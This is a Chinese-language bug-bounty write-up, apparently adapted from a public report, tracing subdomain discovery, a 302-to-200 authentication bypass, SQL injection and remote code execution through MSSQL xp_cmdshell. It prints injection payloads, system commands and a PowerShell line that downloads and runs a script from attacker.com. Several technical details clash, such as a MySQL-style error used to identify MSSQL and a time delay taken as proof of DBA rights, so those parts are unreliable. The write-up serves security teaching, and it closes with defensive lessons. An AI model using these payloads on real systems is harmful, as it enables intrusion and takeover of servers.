# 案例 002：子域名Fuzz → SQL注入 → RCE（$35k）

> **来源**: 基于公开的HackerOne漏洞报告及@rez0的经典博客文章改写。
> **赏金**: $35,000（约25万人民币）。
>
> **法律声明**: 本文仅用于安全技术教学。漏洞发现后已通过正规渠道上报并修复。未经授权复现此攻击属于违法行为。

---

## 概述

| 项目 | 内容 |
|------|------|
| 漏洞类型 | SQL注入 → MSSQL xp_cmdshell → RCE |
| 赏金额度 | $35,000 |
| 攻击路径 | 子域名发现 → 测试环境 → 认证绕过 → SQL注入 → 命令执行 |
| 关键技巧 | 修改302为200绕过认证、子域名fuzz不设限 |

---

## 一、侦察阶段

### 1.1 子域名收集

使用子域名枚举工具对主域名 `target.com` 进行fuzz：

```bash
subfinder -d target.com -silent | tee subs.txt
```

从证书透明度日志中发现了大量子域名，其中一个特别引起了注意：

```
dev-api.target.com           ← 开发环境API
staging-admin.target.com     ← 预发布管理后台
test-console.target.com      ← 测试控制台
uat-panel.target.com         ← UAT环境面板
```

### 1.2 存活检测

对发现的子域名进行存活检测：

```bash
cat subs.txt | httpx -title -status-code -tech-detect -silent
```

结果中 `test-console.target.com` 返回了 **200**，标题为 "Test Console Login"。

**这是一个开放的测试环境登录页面。**

---

## 二、认证绕过

### 2.1 尝试登录

访问 `https://test-console.target.com/login`，这是一个简单的登录表单（用户名+密码）。

使用常见默认凭据尝试登录失败：
- `admin:admin`
- `admin:123456`
- `test:test`

### 2.2 拦截响应

在Burp Suite中观察登录请求/响应：

```
POST /login HTTP/1.1
Host: test-console.target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin123
```

返回：
```
HTTP/1.1 302 Found
Location: /login?error=invalid_credentials
```

### 2.3 关键绕过：修改302为200

测试者注意到这个后台是基于JSP/Servlet的，**认证逻辑是在Filter中判断**：如果未认证则返回302重定向到登录页，如果已认证则转发到主页。

但是——返回302的重定向响应中，服务端只是设置了 `Location` 头，**并没有完全阻止后续访问**。

**绕过方式：拦截302响应，将其修改为200，服务端实际上已经处理了转发逻辑。**

也有另一种说法，是直接访问认证后的路径，然后通过修改响应中的302重定向为200即可浏览。

更准确地说，测试者发现：如果手动将302响应的状态码改为200，响应体中已经包含了目标页面的HTML内容。这是因为服务端在处理登录请求时，虽然判断为未授权并返回302，但**渲染逻辑已经执行了**。

---

## 三、发现SQL注入

### 3.1 探索后台功能

绕过认证后，测试者看到了一个功能完整的后台控制台，包括：
- 用户管理（搜索、编辑、删除）
- 数据查询面板
- 系统日志
- 数据库管理界面

### 3.2 注入点发现

在用户管理面板中，有一个搜索功能：

```
GET /admin/users/search?keyword=test&page=1 HTTP/1.1
```

测试者加入单引号测试：

```
GET /admin/users/search?keyword=test'&page=1 HTTP/1.1
```

返回500错误：
```
HTTP/1.1 500 Internal Server Error
...
Data truncated for column 'keyword'
```

**确认存在SQL注入！**

### 3.3 确认数据库类型

通过报错信息中的特征推断为 **MSSQL**（Microsoft SQL Server）：

```sql
-- 测试MSSQL特有函数
test' WAITFOR DELAY '0:0:5'--
```

响应延迟5秒，确认是MSSQL，且为DBA权限。

---

## 四、SQL注入 → RCE

### 4.1 利用xp_cmdshell

MSSQL的 `xp_cmdshell` 存储过程可以直接执行系统命令：

```sql
'; EXEC xp_cmdshell 'whoami'--
```

返回：
```
NT AUTHORITY\SYSTEM
```

**当前数据库以SYSTEM权限运行！**

### 4.2 执行系统命令

```sql
'; EXEC xp_cmdshell 'ipconfig'--
';

'; EXEC xp_cmdshell 'dir C:\'--
';

'; EXEC xp_cmdshell 'net user'--
```

### 4.3 获取反弹Shell

```sql
'; EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")"'--
```

成功获取了服务器的完全控制权。

---

## 五、漏洞利用链全景

```
subfinder/Amass/证书透明度
        │
        ▼
   test-console.target.com (测试环境)
        │
        ▼
   302→200 响应修改 (认证绕过)
        │
        ▼
   后台搜索功能 (SQL注入)
        │
        ▼
   MSSQL xp_cmdshell (RCE)
        │
        ▼
   SYSTEM权限命令执行
        │
        ▼
   $35,000 Bounty
```

---

## 六、漏洞根因分析

| 问题 | 说明 |
|------|------|
| 子域名暴露 | 测试环境使用公网DNS且无访问限制 |
| 认证逻辑缺陷 | 仅靠302重定向做认证，后端Filter未做二次校验 |
| 测试环境未下线 | 生产级代码和数据在测试环境中使用 |
| SQL注入 | 参数未过滤直接拼接SQL语句，DBA权限运行 |
| xp_cmdshell未禁用 | MSSQL安全最佳实践应禁用xp_cmdshell |

---

## 七、关键教训

### 对白帽子

1. **子域名fuzz不要停** —— 测试环境、UAT环境、过期子域名是漏洞高发区
2. **认证绕过不只有一种方式** —— 改响应码、改Cookie、加Header、弱密码，多管齐下
3. **测试环境的含金量极高** —— 测试环境的安全性往往远低于生产环境
4. **SQL注入确认后别停** —— 判断数据库类型 → 判断权限 → 尝试提权 → RCE
5. **X-Custom-IP-Authorization类Header也值得一试** —— 测试环境可能有内部IP白名单

### 对防御方

1. **测试环境必须隔离** —— 公网不可见，或至少添加IP白名单+强认证
2. **认证必须在服务端做** —— 不能仅靠Filter重定向，应在每个请求中校验Session
3. **测试环境数据脱敏** —— 即便被攻破，也不能让真实用户数据泄露
4. **MSSQL安全基线** —— 非必要禁用xp_cmdshell，使用最小权限账户运行数据库
5. **子域名定期清理** —— 废弃子域名应及时下线或配置DNS解析为空

---

## 八、类似案例变种

| 变种 | 说明 |
|------|------|
| Cookie绕过 | 直接设置 `Cookie: admin=true` 可能绕过简单校验 |
| JWT伪造 | 使用 `alg: none` 或弱密钥爆破 |
| 未认证接口 | 有些接口没有嵌入认证中间件，直接可访问 |
| 参数覆盖 | 加 `?isAdmin=true` 或 `?role=admin` 参数 |
| 直接请求API | 绕过前端，直接调用后端API（前端token校验可能比后端更严格）|

---

> **心法**: 每个子域名都是一扇未上锁的门。测试环境上省掉的安全配置，终将变成35,000美元的赏金。
